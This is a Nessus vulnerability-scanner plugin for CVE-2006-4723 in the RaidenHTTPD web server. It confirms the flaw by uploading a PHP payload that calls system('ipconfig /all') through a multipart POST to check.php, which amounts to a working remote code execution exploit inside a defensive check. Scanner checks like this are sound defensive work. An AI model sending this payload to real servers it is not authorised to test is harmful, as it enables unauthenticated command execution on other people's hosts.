#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is susceptible to a
remote file include attack. 

Description :

The remote host is running RaidenHTTPD, a web server for Windows. 

The version of RaidenHTTPD on the remote host fails to sanitize
user-supplied input to the 'SoftParserFileXml' of the
'/raidenhttpd-admin/slice/check.php' script before using it to include
PHP code.  An unauthenticated attacker may be able to exploit this
issue to view arbitrary files or to execute arbitrary PHP code on the
remote host, subject to the privileges of the user under which the
application runs, LOCAL SYSTEM by default. 

See also :

http://milw0rm.com/exploits/2328

Solution :

Unknown at this time.

Risk factor :

Medium / CVSS Base Score : 5.5
(AV:R/AC:H/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(22317);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-4723");
  script_bugtraq_id(19918);

  script_name(english:"RaidenHTTPD SoftParserFileXml Remote File Include Vulnerability");
  script_summary(english:"Tries to run a command with RaidenHTTPD");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Unless we're paranoid, make sure the banner indicates it's RaidenHTTPD.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "Server: RaidenHTTPD" >!< banner) exit(0);
}


# Make sure the affected script exists.
url = "/raidenhttpd-admin/slice/check.php";
req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if (res == NULL) exit(0);


# If it does...
#
# nb: the script doesn't respond when called directly.
if (egrep(string:res, pattern:"^HTTP/.* 200 OK"))
{
  # Try to exploit the flaw to execute a command.
  cmd = "ipconfig /all";
  boundary = "bound";
  req = string(	
    "POST ",  url, " HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
    "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
    # nb: we'll add the Content-Length header and post data later.
  );
  boundary = string("--", boundary);
  postdata = string(
    boundary, "\r\n", 
    'Content-Disposition: form-data; name="SoftParserFileXml"; filename="', SCRIPT_NAME, '";', "\r\n",
    "Content-Type: image/jpeg;\r\n",
    "\r\n",
    '<? system("', cmd, '"); die; ?>\r\n',

    boundary, "--", "\r\n"
  );
  req = string(
    req,
    "Content-Length: ", strlen(postdata), "\r\n",
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if it looks like the output of ipconfig.
  if ("Windows IP Configuration" >< res)
  {
    if (report_verbosity < 1) report = desc;
    else report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Nessus was able to execute the command '", cmd, "' on the remote\n",
      "host, which produced the following output :\n",
      "\n",
      res
    );

    security_warning(port:port, data:report);
    exit(0);
  }
}
